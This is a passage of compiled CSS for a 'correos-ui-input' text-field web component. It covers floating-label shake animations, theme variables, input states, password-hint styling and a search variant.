					transform: translateX(calc(4% - 0)) translateY(-34.75px) scale(0.75)
				}

				66% {
					-webkit-animation-timing-function: cubic-bezier(0.302435, 0.381352, 0.55, 0.956352);
					animation-timing-function: cubic-bezier(0.302435, 0.381352, 0.55, 0.956352);
					-webkit-transform: translateX(calc(-4% - 0)) translateY(-34.75px) scale(0.75);
					transform: translateX(calc(-4% - 0)) translateY(-34.75px) scale(0.75)
				}

				100% {
					-webkit-transform: translateX(calc(0 - 0)) translateY(-34.75px) scale(0.75);
					transform: translateX(calc(0 - 0)) translateY(-34.75px) scale(0.75)
				}
			}

			@keyframes mdc-floating-label-shake-float-above-text-field-outlined-leading-icon-rtl {
				0% {
					-webkit-transform: translateX(calc(0 - 0)) translateY(-34.75px) scale(0.75);
					transform: translateX(calc(0 - 0)) translateY(-34.75px) scale(0.75)
				}

				33% {
					-webkit-animation-timing-function: cubic-bezier(0.5, 0, 0.701732, 0.495819);
					animation-timing-function: cubic-bezier(0.5, 0, 0.701732, 0.495819);
					-webkit-transform: translateX(calc(4% - 0)) translateY(-34.75px) scale(0.75);
					transform: translateX(calc(4% - 0)) translateY(-34.75px) scale(0.75)
				}

				66% {
					-webkit-animation-timing-function: cubic-bezier(0.302435, 0.381352, 0.55, 0.956352);
					animation-timing-function: cubic-bezier(0.302435, 0.381352, 0.55, 0.956352);
					-webkit-transform: translateX(calc(-4% - 0)) translateY(-34.75px) scale(0.75);
					transform: translateX(calc(-4% - 0)) translateY(-34.75px) scale(0.75)
				}

				100% {
					-webkit-transform: translateX(calc(0 - 0)) translateY(-34.75px) scale(0.75);
					transform: translateX(calc(0 - 0)) translateY(-34.75px) scale(0.75)
				}
			}

			@-webkit-keyframes mdc-floating-label-shake-float-above-text-field-outlined-leading-icon-dense-rtl {
				0% {
					-webkit-transform: translateX(calc(0 - -21px)) translateY(-120%) scale(0.8);
					transform: translateX(calc(0 - -21px)) translateY(-120%) scale(0.8)
				}

				33% {
					-webkit-animation-timing-function: cubic-bezier(0.5, 0, 0.701732, 0.495819);
					animation-timing-function: cubic-bezier(0.5, 0, 0.701732, 0.495819);
					-webkit-transform: translateX(calc(4% - -21px)) translateY(-120%) scale(0.8);
					transform: translateX(calc(4% - -21px)) translateY(-120%) scale(0.8)
				}

				66% {
					-webkit-animation-timing-function: cubic-bezier(0.302435, 0.381352, 0.55, 0.956352);
					animation-timing-function: cubic-bezier(0.302435, 0.381352, 0.55, 0.956352);
					-webkit-transform: translateX(calc(-4% - -21px)) translateY(-120%) scale(0.8);
					transform: translateX(calc(-4% - -21px)) translateY(-120%) scale(0.8)
				}

				100% {
					-webkit-transform: translateX(calc(0 - -21px)) translateY(-120%) scale(0.8);
					transform: translateX(calc(0 - -21px)) translateY(-120%) scale(0.8)
				}
			}

			@keyframes mdc-floating-label-shake-float-above-text-field-outlined-leading-icon-dense-rtl {
				0% {
					-webkit-transform: translateX(calc(0 - -21px)) translateY(-120%) scale(0.8);
					transform: translateX(calc(0 - -21px)) translateY(-120%) scale(0.8)
				}

				33% {
					-webkit-animation-timing-function: cubic-bezier(0.5, 0, 0.701732, 0.495819);
					animation-timing-function: cubic-bezier(0.5, 0, 0.701732, 0.495819);
					-webkit-transform: translateX(calc(4% - -21px)) translateY(-120%) scale(0.8);
					transform: translateX(calc(4% - -21px)) translateY(-120%) scale(0.8)
				}

				66% {
					-webkit-animation-timing-function: cubic-bezier(0.302435, 0.381352, 0.55, 0.956352);
					animation-timing-function: cubic-bezier(0.302435, 0.381352, 0.55, 0.956352);
					-webkit-transform: translateX(calc(-4% - -21px)) translateY(-120%) scale(0.8);
					transform: translateX(calc(-4% - -21px)) translateY(-120%) scale(0.8)
				}

				100% {
					-webkit-transform: translateX(calc(0 - -21px)) translateY(-120%) scale(0.8);
					transform: translateX(calc(0 - -21px)) translateY(-120%) scale(0.8)
				}
			}

			@-webkit-keyframes mdc-floating-label-shake-float-above-textarea {
				0% {
					-webkit-transform: translateX(calc(0 - 0%)) translateY(-130%) scale(0.75);
					transform: translateX(calc(0 - 0%)) translateY(-130%) scale(0.75)
				}

				33% {
					-webkit-animation-timing-function: cubic-bezier(0.5, 0, 0.701732, 0.495819);
					animation-timing-function: cubic-bezier(0.5, 0, 0.701732, 0.495819);
					-webkit-transform: translateX(calc(4% - 0%)) translateY(-130%) scale(0.75);
					transform: translateX(calc(4% - 0%)) translateY(-130%) scale(0.75)
				}

				66% {
					-webkit-animation-timing-function: cubic-bezier(0.302435, 0.381352, 0.55, 0.956352);
					animation-timing-function: cubic-bezier(0.302435, 0.381352, 0.55, 0.956352);
					-webkit-transform: translateX(calc(-4% - 0%)) translateY(-130%) scale(0.75);
					transform: translateX(calc(-4% - 0%)) translateY(-130%) scale(0.75)
				}

				100% {
					-webkit-transform: translateX(calc(0 - 0%)) translateY(-130%) scale(0.75);
					transform: translateX(calc(0 - 0%)) translateY(-130%) scale(0.75)
				}
			}

			@keyframes mdc-floating-label-shake-float-above-textarea {
				0% {
					-webkit-transform: translateX(calc(0 - 0%)) translateY(-130%) scale(0.75);
					transform: translateX(calc(0 - 0%)) translateY(-130%) scale(0.75)
				}

				33% {
					-webkit-animation-timing-function: cubic-bezier(0.5, 0, 0.701732, 0.495819);
					animation-timing-function: cubic-bezier(0.5, 0, 0.701732, 0.495819);
					-webkit-transform: translateX(calc(4% - 0%)) translateY(-130%) scale(0.75);
					transform: translateX(calc(4% - 0%)) translateY(-130%) scale(0.75)
				}

				66% {
					-webkit-animation-timing-function: cubic-bezier(0.302435, 0.381352, 0.55, 0.956352);
					animation-timing-function: cubic-bezier(0.302435, 0.381352, 0.55, 0.956352);
					-webkit-transform: translateX(calc(-4% - 0%)) translateY(-130%) scale(0.75);
					transform: translateX(calc(-4% - 0%)) translateY(-130%) scale(0.75)
				}

				100% {
					-webkit-transform: translateX(calc(0 - 0%)) translateY(-130%) scale(0.75);
					transform: translateX(calc(0 - 0%)) translateY(-130%) scale(0.75)
				}
			}

			.mdc-text-field-helper-text.sc-correos-ui-input {
				font-family: Roboto, sans-serif;
				-moz-osx-font-smoothing: grayscale;
				-webkit-font-smoothing: antialiased;
				font-size: 0.75rem;
				line-height: 1.25rem;
				font-weight: 400;
				letter-spacing: 0.0333333333em;
				text-decoration: inherit;
				text-transform: inherit;
				display: block;
				margin-top: 0;
				line-height: normal;
				margin: 0;
				-webkit-transition: opacity 150ms cubic-bezier(0.4, 0, 0.2, 1);
				transition: opacity 150ms cubic-bezier(0.4, 0, 0.2, 1);
				opacity: 0;
				will-change: opacity
			}

			.mdc-text-field-helper-text.sc-correos-ui-input::before {
				display: inline-block;
				width: 0;
				height: 16px;
				content: "";
				vertical-align: 0
			}

			.mdc-text-field-helper-text--persistent.sc-correos-ui-input {
				-webkit-transition: none;
				transition: none;
				opacity: 1;
				will-change: initial
			}

			.sc-correos-ui-input-h {
				--_ui-input-bg-color: var(--ui-input-bg-color, #F3F2F2);
				--_ui-input-bg-light-color: var(--ui-input-bg-light-color, #ffe2e2);
				--_ui-input-border-radius: var(--ui-input-border-radius, 8px);
				--_ui-input-border-color: var(--ui-input-border-color, yellow);
				--_ui-input-error-color: var(--ui-input-error-color, rgb(243, 39, 192));
				--_ui-input-disabled-color: var(--ui-input-disabled-color, #333333);
				--_ui-input-field-color: var(--ui-input-field-color, #329b43);
				--_ui-input-field-color-empty: var(--ui-input-field-color-empty, #666666);
				--_ui-input-icon-size: var(--ui-input-icon-size, 24px);
				--_ui-input-icon-margin-right: var(--ui-input-icon-margin-right, 16px);
				--_ui-input-label-color: var(--ui-input-label-color, #000066);
				--_ui-input-line-color: var(--ui-input-line-color, rgb(0, 247, 255));
				--_ui-input-line-color-ripple: var(--ui-input-line-color-ripple, #000066);
				--_ui-input-valid-color: var(--ui-input-valid-color, #348F41);
				--ui-input-bg-light-color: var(--theme-color-white-plain)
			}

			.sc-correos-ui-input-h .sc-correos-ui-input-s>[slot=icon] {
				color: var(--_ui-input-label-color);
				fill: var(--_ui-input-label-color);
				margin-right: var(--_ui-input-icon-margin-right);
				height: var(--_ui-input-icon-size);
				width: var(--_ui-input-icon-size);
				display: inline-block;
				margin-bottom: 16px
			}

			.sc-correos-ui-input-h {
				display: -ms-flexbox;
				display: flex
			}

			.--with-desc.sc-correos-ui-input-h {
				-ms-flex-direction: column;
				flex-direction: column
			}

			.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input {
				width: 100%;
				display: -ms-flexbox;
				display: flex;
				-ms-flex-wrap: wrap;
				flex-wrap: wrap;
				-ms-flex-align: baseline;
				align-items: baseline
			}

			.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-floating-label.sc-correos-ui-input {
				max-width: calc(100% - 32px);
				font-family: var(--theme-fontFamily-main)
			}

			.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input {
				max-width: 100%
			}

			.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input {
				font-family: var(--theme-fontFamily-main)
			}

			.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input:-webkit-autofill+.mdc-floating-label.sc-correos-ui-input {
				-webkit-transform: translateY(-106%) scale(0.75);
				transform: translateY(-106%) scale(0.75)
			}

			.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input:focus {
				outline: none
			}

			.sc-correos-ui-input-h .correos-ui-input_root.light.sc-correos-ui-input .mdc-text-field.sc-correos-ui-input:not(.mdc-text-field--disabled) {
				background-color: var(--_ui-input-bg-light-color)
			}

			.sc-correos-ui-input-h .correos-ui-input_root.light.sc-correos-ui-input .mdc-text-field.sc-correos-ui-input.sc-correos-ui-input:before {
				opacity: 0;
				background-color: var(--_ui-input-bg-light-color)
			}

			.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.sc-correos-ui-input {
				width: 100%;
				display: inline-block;
				border-radius: var(--_ui-input-border-radius) var(--_ui-input-border-radius) 0 0;
				border-top: 1px solid var(--_ui-input-border-color);
				border-left: 1px solid var(--_ui-input-border-color);
				border-right: 1px solid var(--_ui-input-border-color)
			}

			@media (max-width: 639px) {
				.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.sc-correos-ui-input {
					height: 3rem
				}
			}

			.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.sc-correos-ui-input input[type=number].sc-correos-ui-input::-webkit-outer-spin-button,
			.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.sc-correos-ui-input input[type=number].sc-correos-ui-input::-webkit-inner-spin-button {
				-webkit-appearance: none;
				margin: 0
			}

			.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.sc-correos-ui-input input[type=number].sc-correos-ui-input {
				-moz-appearance: textfield
			}

			.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.sc-correos-ui-input:not(.mdc-text-field--disabled) .mdc-text-field__input.sc-correos-ui-input {
				color: var(--_ui-input-field-color-empty)
			}

			.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.sc-correos-ui-input:not(.mdc-text-field--disabled):not(.mdc-text-field--outlined):not(.mdc-text-field--textarea) .mdc-text-field__input.sc-correos-ui-input {
				border-bottom-color: var(--_ui-input-line-color)
			}

			.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.sc-correos-ui-input:not(.mdc-text-field--disabled) {
				background-color: var(--_ui-input-bg-color)
			}

			.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.sc-correos-ui-input:not(.mdc-text-field--disabled) .mdc-line-ripple.sc-correos-ui-input {
				background-color: var(--_ui-input-line-color-ripple)
			}

			.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.sc-correos-ui-input:not(.mdc-text-field--disabled):not(.mdc-text-field--outlined):not(.mdc-text-field--textarea) .mdc-text-field__input.sc-correos-ui-input:hover {
				border-bottom-color: var(--_ui-input-line-color)
			}

			.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.mdc-text-field--with-preppend-icon.sc-correos-ui-input {
				width: calc(100% - var(--_ui-input-icon-size) - var(--_ui-input-icon-margin-right))
			}

			.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.sc-correos-ui-input:hover input.sc-correos-ui-input,
			.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.sc-correos-ui-input:focus input.sc-correos-ui-input {
				border-bottom: 2px solid;
				padding-bottom: 5px
			}

			.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.sc-correos-ui-input:hover input.sc-correos-ui-input {
				cursor: pointer
			}

			.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.sc-correos-ui-input:hover:not(:focus):not(.mdc-text-field--focused):not(.mdc-text-field--invalid):not(.mdc-text-field--disabled):not(.mdc-text-field--force-error):not(.mdc-text-field--disabled) .mdc-floating-label.sc-correos-ui-input {
				color: var(--_ui-input-field-color)
			}

			.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.mdc-text-field--focused.sc-correos-ui-input:not(.mdc-text-field--disabled) .mdc-floating-label.sc-correos-ui-input {
				color: var(--_ui-input-label-color)
			}

			.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.mdc-text-field--focused.sc-correos-ui-input:not(.mdc-text-field--disabled) .mdc-text-field__input.sc-correos-ui-input {
				color: var(--_ui-input-field-color)
			}

			.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.mdc-text-field--force-error.sc-correos-ui-input:not(.mdc-text-field--disabled) .mdc-floating-label.sc-correos-ui-input {
				color: var(--_ui-input-error-color)
			}

			.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.mdc-text-field--force-error.sc-correos-ui-input:not(.mdc-text-field--disabled):not(.mdc-text-field--outlined):not(.mdc-text-field--textarea) .mdc-text-field__input.sc-correos-ui-input {
				border-bottom-color: var(--_ui-input-error-color)
			}

			.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.mdc-text-field--force-error.sc-correos-ui-input:not(.mdc-text-field--disabled) .mdc-line-ripple.sc-correos-ui-input {
				background-color: var(--_ui-input-error-color)
			}

			.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.mdc-text-field--force-error.sc-correos-ui-input:not(.mdc-text-field--disabled)+.mdc-text-field-helper-line.sc-correos-ui-input .mdc-text-field-helper-text.sc-correos-ui-input {
				color: var(--_ui-input-error-color)
			}

			.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.mdc-text-field--invalid.sc-correos-ui-input .mdc-text-field__icon.sc-correos-ui-input .trailing-icon.sc-correos-ui-input {
				fill: var(--_ui-input-error-color)
			}

			.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.mdc-text-field--invalid.sc-correos-ui-input:not(.mdc-text-field--disabled) .mdc-floating-label.sc-correos-ui-input {
				color: var(--_ui-input-error-color)
			}

			.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.mdc-text-field--invalid.sc-correos-ui-input:not(.mdc-text-field--disabled):not(.mdc-text-field--outlined):not(.mdc-text-field--textarea) .mdc-text-field__input.sc-correos-ui-input {
				border-bottom-color: var(--_ui-input-error-color)
			}

			.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.mdc-text-field--invalid.sc-correos-ui-input:not(.mdc-text-field--disabled) .mdc-line-ripple.sc-correos-ui-input {
				background-color: var(--_ui-input-error-color)
			}

			.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.mdc-text-field--invalid.sc-correos-ui-input:not(.mdc-text-field--disabled)+.mdc-text-field-helper-line.sc-correos-ui-input .mdc-text-field-helper-text.sc-correos-ui-input {
				color: var(--_ui-input-error-color)
			}

			@media (min-width: 1024px) {
				.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.mdc-text-field--filled.sc-correos-ui-input:hover .mdc-text-field__icon.--cancel-icon.sc-correos-ui-input {
					display: -ms-flexbox;
					display: flex
				}
			}

			.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.mdc-text-field--filled.sc-correos-ui-input:focus-within .mdc-text-field__icon.--cancel-icon.sc-correos-ui-input {
				display: none
			}

			@media (min-width: 1024px) {
				.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.mdc-text-field--filled.sc-correos-ui-input:focus-within .mdc-text-field__icon.--cancel-icon.sc-correos-ui-input {
					display: -ms-flexbox;
					display: flex
				}
			}

			.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.mdc-text-field--filled.sc-correos-ui-input .mdc-text-field__icon.sc-correos-ui-input {
				display: -ms-flexbox;
				display: flex
			}

			@media (min-width: 1024px) {
				.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.mdc-text-field--filled.sc-correos-ui-input .mdc-text-field__icon.--cancel-icon.sc-correos-ui-input {
					display: none
				}
			}

			.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.mdc-text-field--disabled.sc-correos-ui-input {
				border-top: 1px solid var(--_ui-input-border-color);
				border-left: 1px solid var(--_ui-input-border-color);
				border-right: 1px solid var(--_ui-input-border-color)
			}

			.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.mdc-text-field--disabled.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input {
				border-bottom-color: var(--_ui-input-disabled-color)
			}

			.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.mdc-text-field--filled.sc-correos-ui-input:not(:focus):not(.mdc-text-field--focused):not(.mdc-text-field--invalid):not(.mdc-text-field--disabled):not(.mdc-text-field--force-error):not(.mdc-text-field--disabled) .mdc-text-field__input.sc-correos-ui-input {
				color: var(--_ui-input-field-color)
			}

			.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.mdc-text-field--filled.sc-correos-ui-input:not(:focus):not(.mdc-text-field--focused):not(.mdc-text-field--invalid):not(.mdc-text-field--disabled):not(.mdc-text-field--force-error):not(.mdc-text-field--disabled):not(.mdc-text-field--outlined):not(.mdc-text-field--textarea) .mdc-text-field__input.sc-correos-ui-input {
				border-bottom-color: var(--_ui-input-line-color)
			}

			.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field__icon.sc-correos-ui-input {
				display: -ms-flexbox;
				display: flex
			}

			.sc-correos-ui-input-h .correos-ui-input_root__invalid.sc-correos-ui-input {
				padding: 16px 0;
				display: block;
				width: 100%
			}

			.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field-helper-text.sc-correos-ui-input:before {
				content: none
			}

			.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field-helper-text--opacity.sc-correos-ui-input {
				opacity: 100%
			}

			.sc-correos-ui-input-h .correos-ui-input_root__txt-invalid.sc-correos-ui-input {
				margin: 0
			}

			.sc-correos-ui-input-h .correos-ui-input_root__list-password.sc-correos-ui-input {
				margin-top: 8px;
				margin-bottom: 0;
				display: none;
				-ms-flex-pack: justify;
				justify-content: space-between;
				-ms-flex-align: center;
				align-items: center;
				-ms-flex-wrap: wrap;
				flex-wrap: wrap
			}

			.sc-correos-ui-input-h .correos-ui-input_root__list-password.active.sc-correos-ui-input {
				display: -ms-flexbox;
				display: flex
			}

			.sc-correos-ui-input-h .correos-ui-input_root__item-password.sc-correos-ui-input {
				-ms-flex: 0 1 50%;
				flex: 0 1 50%;
				text-align: left
			}

			.sc-correos-ui-input-h .correos-ui-input_root__icon-password.sc-correos-ui-input,
			.sc-correos-ui-input-h .correos-ui-input_root__txt-password.sc-correos-ui-input {
				display: inline-block;
				vertical-align: middle;
				margin-right: 8px
			}

			.sc-correos-ui-input-h .correos-ui-input_root__icon-password.icon-check.sc-correos-ui-input,
			.sc-correos-ui-input-h .correos-ui-input_root__icon-password--green.sc-correos-ui-input,
			.sc-correos-ui-input-h .correos-ui-input_root__txt-password.icon-check.sc-correos-ui-input,
			.sc-correos-ui-input-h .correos-ui-input_root__txt-password--green.sc-correos-ui-input {
				color: var(--_ui-input-valid-color)
			}

			.sc-correos-ui-input-h .correos-ui-input_root__icon-password.icon-close.sc-correos-ui-input,
			.sc-correos-ui-input-h .correos-ui-input_root__icon-password--red.sc-correos-ui-input,
			.sc-correos-ui-input-h .correos-ui-input_root__txt-password.icon-close.sc-correos-ui-input,
			.sc-correos-ui-input-h .correos-ui-input_root__txt-password--red.sc-correos-ui-input {
				color: var(--_ui-input-error-color)
			}

			.sc-correos-ui-input-h .correos-ui-input_root__icon-password.sc-correos-ui-input {
				margin-right: 8px
			}

			.sc-correos-ui-input-h .correos-ui-input_root__container-ico.sc-correos-ui-input {
				vertical-align: middle;
				display: inline-block
			}

			.sc-correos-ui-input-h input[type=search].sc-correos-ui-input::-webkit-search-decoration,
			.sc-correos-ui-input-h input[type=search].sc-correos-ui-input::-webkit-search-cancel-button,
			.sc-correos-ui-input-h input[type=search].sc-correos-ui-input::-webkit-search-results-button,
			.sc-correos-ui-input-h input[type=search].sc-correos-ui-input::-webkit-search-results-decoration {
				display: none
			}

			.sc-correos-ui-input-h .ui-description.sc-correos-ui-input {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-direction: column;
				flex-direction: column
			}

			.sc-correos-ui-input-h .ui-description_text.sc-correos-ui-input {
				font-size: 100%;
				margin: 0;
				padding: 0;
				font-weight: normal;
				font-size: 0.75rem;
				line-height: 1.175rem;
				color: var(--_ui-radio-button-text-color);
				font-weight: 300;
				margin-bottom: 16px;
				word-break: keep-all
			}

			@media (min-width: 1024px) {
				.sc-correos-ui-input-h .ui-description_text.sc-correos-ui-input {
					font-size: 0.875rem;
					line-height: 1.25rem
				}
			}

			.sc-correos-ui-input-h .ui-container-menu.sc-correos-ui-input {
				position: relative;
				width: 100%;
				z-index: 16
			}

			__icon-password.sc-correos-ui-input-h {
				margin-right: 8px
			}

			__paragraph-container.sc-correos-ui-input-h {
				padding-top: 16px
			}

			__paragraph.sc-correos-ui-input-h {
				font-size: 100%;
				margin: 0;
				padding: 0;
				font-weight: normal;
				font-weight: 300;
				font-size: 12px;
				line-height: 18px;
				color: var(--_ui-input-disabled-color);
				padding: 8px 0;
				vertical-align: middle;
				display: inline-block;
				position: relative
			}

			@media (min-width: 1024px) {
				__paragraph.sc-correos-ui-input-h {
					font-size: 14px;
					line-height: 20px
				}
			}

			__paragraph__container-ico.sc-correos-ui-input-h {
				vertical-align: middle;
				display: inline-block
			}

			@media (max-width: 639px) {
				__paragraph.sc-correos-ui-input-h .mdc-floating-label.sc-correos-ui-input {
					font-size: 0.875rem;
					bottom: 3px
				}
			}

			__paragraph.sc-correos-ui-input-h .mdc-floating-label__paragraph.sc-correos-ui-input {
				font-size: 100%;
				margin: 0;
				padding: 0;
				font-weight: normal;
				font-weight: 300;
				font-size: 12px;
				line-height: 18px;
				color: var(--_ui-input-disabled-color);
				padding: 8px 0;
				vertical-align: bottom;
				display: inline-block
			}

			@media (min-width: 1024px) {
				__paragraph.sc-correos-ui-input-h .mdc-floating-label__paragraph.sc-correos-ui-input {
					font-size: 14px;
					line-height: 20px
				}
			}

			__paragraph.sc-correos-ui-input-h .mdc-floating-label__button-info.sc-correos-ui-input {
				border: unset;
				cursor: pointer;
				margin: 0;
				padding: 0;
				width: unset;
				overflow: unset;
				background: unset;
				text-align: flex-start;
				color: inherit;
				font: inherit;
				line-height: inherit;
				-webkit-font-smoothing: inherit;
				-moz-osx-font-smoothing: inherit;
				-webkit-appearance: none;
				color: var(--_ui-input-label-color);
				vertical-align: bottom;
				display: inline-block
			}

			__paragraph.sc-correos-ui-input-h .mdc-floating-label__button-info.sc-correos-ui-input::-moz-focus-inner {
				border: 0;
				padding: 0
			}

			__paragraph.sc-correos-ui-input-h .mdc-floating-label__container-hidden.sc-correos-ui-input {
				background-color: var(--_ui-input-label-color);
				padding: 8px;
				border-radius: 8px;
				width: 100%;
				position: relative;
				display: none
			}

			__paragraph.sc-correos-ui-input-h .mdc-floating-label__container-hidden.active.sc-correos-ui-input {
				display: block
			}

			__paragraph.sc-correos-ui-input-h .mdc-floating-label__container-hidden.sc-correos-ui-input:after {
				bottom: 100%;
				border: solid transparent;
				left: 20%;
				content: " ";
				height: 0;
				width: 0;
				position: absolute;
				pointer-events: none;
				border-color: rgba(136, 183, 213, 0);
				border-bottom-color: var(--_ui-input-label-color);
				border-width: 6px
			}

			@media (min-width: 1024px) {
				__paragraph.sc-correos-ui-input-h .mdc-floating-label__container-hidden.sc-correos-ui-input:after {
					left: 58%
				}
			}

			__paragraph.sc-correos-ui-input-h .mdc-floating-label__hide-paragraph.sc-correos-ui-input {
				font-size: 100%;
				margin: 0;
				padding: 0;
				font-weight: normal;
				color: var(--ui-input-bg-light-color);
				font-size: 12px;
				line-height: 18px
			}

			@media (max-width: 639px) {
				__paragraph.sc-correos-ui-input-h .mdc-floating-label.sc-correos-ui-input .mdc-floating-label.sc-correos-ui-input {
					font-size: 0.875rem;
					bottom: 3px
				}
			}

			__paragraph.sc-correos-ui-input-h .mdc-floating-label.sc-correos-ui-input .mdc-text-field-helper-line.sc-correos-ui-input {
				width: 100%
			}

			__paragraph.sc-correos-ui-input-h .mdc-floating-label.sc-correos-ui-input .mdc-text-field-helper-line.sc-correos-ui-input .mdc-text-field--with-preppend-icon.sc-correos-ui-input {
				margin-left: calc(var(--_ui-input-icon-size) + var(--_ui-input-icon-margin-right))
			}

			[type=date-pick].sc-correos-ui-input-h .mdc-text-field__icon.sc-correos-ui-input {
				pointer-events: none
			}

			[type=search].sc-correos-ui-input-h .mdc-text-field__icon.sc-correos-ui-input {
				fill: var(--theme-color-blue)
			}

			[type=search].sc-correos-ui-input-h .mdc-text-field--with-search-variant.sc-correos-ui-input {
				display: -ms-flexbox !important;
				display: flex !important
			}

			[type=search].sc-correos-ui-input-h .mdc-text-field.sc-correos-ui-input .--notCursor.sc-correos-ui-input {
				fill: var(--theme-color-lightGrey)
			}

			[type=search].sc-correos-ui-input-h .mdc-text-field.sc-correos-ui-input .--notCursor.sc-correos-ui-input:hover {
				cursor: default
			}

			[type=search].sc-correos-ui-input-h .mdc-text-field.sc-correos-ui-input .--forceblue.sc-correos-ui-input {
				fill: var(--theme-color-blue) !important
			}

			[type=search].sc-correos-ui-input-h .mdc-text-field.sc-correos-ui-input .search-variant-icon.sc-correos-ui-input {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-align: center;
				align-items: center;
				height: 100%;
				border-bottom: 1px solid;
				border-bottom-color: var(--_ui-input-line-color)
			}

			[type=search].sc-correos-ui-input-h .mdc-text-field.sc-correos-ui-input .icon-search.sc-correos-ui-input {
				height: 32px;
				width: 32px;
				color: var(--_ui-input-label-color);
				padding-left: 8px
			}

			[type=search].sc-correos-ui-input-h .mdc-text-field.sc-correos-ui-input .--withSearchIcon.sc-correos-ui-input {
				padding-left: 4px !important
			}

			[type=search].sc-correos-ui-input-h .mdc-text-field.sc-correos-ui-input .--withSearchIconLabel.sc-correos-ui-input {
				padding-left: 24px
			}

			[type=search].sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.mdc-text-field--filled.sc-correos-ui-input:not(:focus):not(.mdc-text-field--focused):not(.mdc-text-field--invalid):not(.mdc-text-field--disabled):not(.mdc-text-field--force-error):not(.mdc-text-field--disabled) .mdc-text-field__input.sc-correos-ui-input {
				color: var(--_ui-input-field-color)
			}

			[type=search].sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.mdc-text-field--filled.sc-correos-ui-input:not(:focus):not(.mdc-text-field--focused):not(.mdc-text-field--invalid):not(.mdc-text-field--disabled):not(.mdc-text-field--force-error) .mdc-text-field__icon.sc-correos-ui-input .trailing-icon.sc-correos-ui-input {
				fill: var(--ui-input-label-color)
			}

			[type=search].sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.mdc-text-field--filled.sc-correos-ui-input:not(:focus):not(.mdc-text-field--focused):not(.mdc-text-field--invalid):not(.mdc-text-field--disabled):not(.mdc-text-field--force-error):not(.mdc-text-field--disabled) .mdc-floating-label.sc-correos-ui-input {
				color: var(--ui-input-label-color)
			}

			[type=search].sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.mdc-text-field--filled.sc-correos-ui-input:not(:focus):not(.mdc-text-field--focused):not(.mdc-text-field--invalid):not(.mdc-text-field--disabled):not(.mdc-text-field--force-error):not(.mdc-text-field--disabled):not(.mdc-text-field--outlined):not(.mdc-text-field--textarea) .mdc-text-field__input.sc-correos-ui-input {
				border-bottom-color: var(--ui-input-label-color)
			}

			[variant=straight-lines].sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.sc-correos-ui-input {
				border: none;
				border-radius: initial
			}

